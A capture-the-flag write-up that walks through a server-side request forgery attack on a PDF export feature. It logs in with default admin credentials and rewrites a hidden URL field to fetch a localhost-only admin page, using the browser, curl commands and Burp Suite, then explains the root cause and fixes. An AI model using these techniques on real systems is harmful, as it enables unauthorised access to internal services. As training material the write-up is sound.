## Overview

Surfer is a CTF room that demonstrates **SSRF through a PDF export feature**. The application has an internal admin page restricted to localhost access, but a PDF exporter that accepts a URL parameter can be tricked into fetching internal pages — revealing the flag.

---

## What is SSRF?

**Server-Side Request Forgery (SSRF)** occurs when an application fetches remote resources based on user-controlled input. An attacker can make the server send requests to internal services that aren't publicly accessible.

**Key concept:** If the application can reach internal resources (localhost, private IPs), and you control what it fetches, you can access things you shouldn't be able to see.

## Reconnaissance

### Port Scan

```bash
nmap -sV -sC -T4 -Pn 10.49.132.99
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache
```

### Directory Enumeration

```bash
gobuster dir -u http://10.49.132.99 -w /usr/share/wordlists/dirb/common.txt -x php
```

Found pages:
- `/login.php`
- `/verify.php`
- `/index.php`
- `/export2pdf.php`
- `/internal/admin.php`

### Login Page Analysis

Viewing the page source revealed the login form structure:

```html
<form action="verify.php" method="POST">
    <input type="text" name="username" id="uname" required>
    <input type="password" name="password" id="psw" required>
</form>
```

**Note:** The `name` attributes differ from the `id` attributes. When using curl, use the `name` values (`username` / `password`).

## Exploitation

Three methods to solve this box.

### Method 1 — Browser (Easiest)

**Step 1:** Login to the web portal at `http://10.49.132.99/login.php` with credentials:

```
Username: admin
Password: admin
```

**Step 2:** Press **F12** to open Developer Tools. Switch to the **Elements** or **Inspector** tab.

**Step 3:** Find the hidden form field in the dashboard:

```html
<input type="hidden" id="url" name="url" value="http://127.0.0.1/server-info.php">
```

**Step 4:** Double-click the `value` attribute and change it to:

```
http://127.0.0.1/internal/admin.php
```

**Step 5:** Click **Export to PDF**. The downloaded PDF contains the flag.

---

### Method 2 — Curl (Command Line)

**Step 1:** Login and capture the session cookie:

```bash
curl -c /tmp/cookies.txt -d "username=admin&password=admin" \
  http://10.49.132.99/verify.php
```

**Step 2:** Export the internal admin page to PDF:

```bash
curl -b /tmp/cookies.txt -X POST http://10.49.132.99/export2pdf.php \
  -d "url=http://127.0.0.1/internal/admin.php" \
  -o /tmp/flag.pdf
```

**Step 3:** Extract the flag from the PDF:

```bash
pdftotext /tmp/flag.pdf -
```

**One-liner version:**

```bash
curl -c /tmp/sesh.txt -d "username=admin&password=admin" \
  http://10.49.132.99/verify.php && \
curl -b /tmp/sesh.txt -d "url=http://127.0.0.1/internal/admin.php" \
  http://10.49.132.99/export2pdf.php -o /tmp/flag.pdf && \
pdftotext /tmp/flag.pdf -
```

---

### Method 3 — Intercept with Burp Suite

**Step 1:** Login to the web portal.
**Step 2:** Configure Burp Suite as your proxy and intercept the "Export to PDF" request.
**Step 3:** Modify the `url` POST parameter from:

```
url=http://127.0.0.1/server-info.php
```

to:

```
url=http://127.0.0.1/internal/admin.php
```

**Step 4:** Forward the request. Response contains the PDF with the flag.

### SSH? (Not Applicable)

SSH (port 22) is open on the target but `admin:admin` credentials don't work for SSH access — they only authenticate against the web application's login form. The intended path is SSRF through the PDF export feature, not SSH.

## Root Cause Analysis

The vulnerability exists because:

1. **Unauthenticated URL parameter** — The `export2pdf.php` endpoint accepts a `url` parameter without validating it against an allowlist
2. **No localhost restriction on fetch** — The PDF generator (TCPDF) fetches any URL, including internal-only endpoints
3. **Hidden field, not protected field** — Relying on a hidden input field is not security. Anyone can modify it via browser DevTools, curl, or Burp Suite
4. **Internal page trusts localhost** — `/internal/admin.php` checks the request source but trusts 127.0.0.1 implicitly

The fix would be:
- Implement an allowlist of permitted URLs for PDF export
- Use server-side URL validation (not client-side hidden fields)
- Add authentication to `/internal/admin.php` rather than relying on IP-based access control
- Fetch the server info internally rather than accepting a user-controlled URL

---

## Key Takeaways

| Lesson | Why It Matters |
|--------|---------------|
| **Hidden inputs are not secure** | Any client-side value can be modified by the user |
| **SSRF via PDF generators** | Any tool that fetches URLs during PDF generation can be exploited to access internal services |
| **Check `name` not just `id`** | Form field `name` attributes determine POST data keys, not `id` |
| **Session cookies enable automation** | `curl -c` and `-b` let you script authenticated web requests |
| **Browser DevTools for quick wins** | No terminal needed — modify hidden fields directly in the browser |
